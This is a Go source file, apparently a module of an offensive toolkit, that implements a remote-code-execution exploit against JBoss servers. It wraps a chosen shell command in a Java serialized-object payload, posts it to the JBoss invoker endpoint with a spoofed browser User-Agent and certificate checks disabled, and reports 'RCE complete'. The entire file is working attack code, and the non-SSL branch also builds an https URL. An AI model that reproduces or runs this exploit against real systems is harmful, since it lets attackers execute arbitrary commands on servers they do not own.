package jbos

import (
	"bytes"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"log"
	"net/http"
	"os"

	JBOS_CONSTANTS "main/modg/scripts/injection/jbos/jc"
)

func ce(err error, exit_code int, msg string) bool {
	if err != nil {
		if msg == "" {
			fmt.Println(err)
			os.Exit(exit_code)
			return true
		} else {
			log.Fatal(err, msg)
			os.Exit(exit_code)
			return true
		}
	} else {
		return false
	}
}

func Inject_JBOS(ssl bool, command, host string) (int, error) {
	obj_serial, err := hex.DecodeString(JBOS_CONSTANTS.HEX_DECODE_BEFORE_BUF)
	ce(err, 1, "ERROR DECODING STRING")
	obj_serial = append(obj_serial, byte(len(command)))
	obj_serial = append(obj_serial, []byte(command)...)
	bf_af, err := hex.DecodeString(JBOS_CONSTANTS.HEX_DECODE_AFTER_BUF)
	ce(err, 1, "ERROR: FATAL: ERROR HEX DECODING AFTER BUF")
	obj_serial = append(obj_serial, bf_af...)
	if ssl {
		JBOS_CONSTANTS.JBOS_CLIENT = &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
				},
			},
		}
		JBOS_CONSTANTS.JBOS_URL = fmt.Sprintf("https://%s/%s", host, JBOS_CONSTANTS.JBOS_BASE_PATH_INVOKER)
	} else {
		JBOS_CONSTANTS.JBOS_CLIENT = &http.Client{}
		JBOS_CONSTANTS.JBOS_URL = fmt.Sprintf("https://%s/%s", host, JBOS_CONSTANTS.JBOS_BASE_PATH_INVOKER)
	}
	main_request, http_err := http.NewRequest(JBOS_CONSTANTS.JBOS_REQ_METHOD, JBOS_CONSTANTS.JBOS_URL, bytes.NewReader(obj_serial))
	ce(http_err, 1, "COULD NOT CREATE NEW POST REQUEST USING HTTP CLIENT")
	main_request.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko")
	main_request.Header.Set("Content-Type", "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue")
	response, err := JBOS_CONSTANTS.JBOS_CLIENT.Do(main_request)
	if err != nil {
		return 0, err
	}
	if response.StatusCode == 200 {
		fmt.Println("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| JBOS Module: RCE complete, command has been executed ")
		fmt.Println("-----------------------------------------------------------")
		fmt.Printf("< Command > | %s | < Status Code > | %v | \n", command, response.StatusCode)
	}
	return response.StatusCode, nil
}
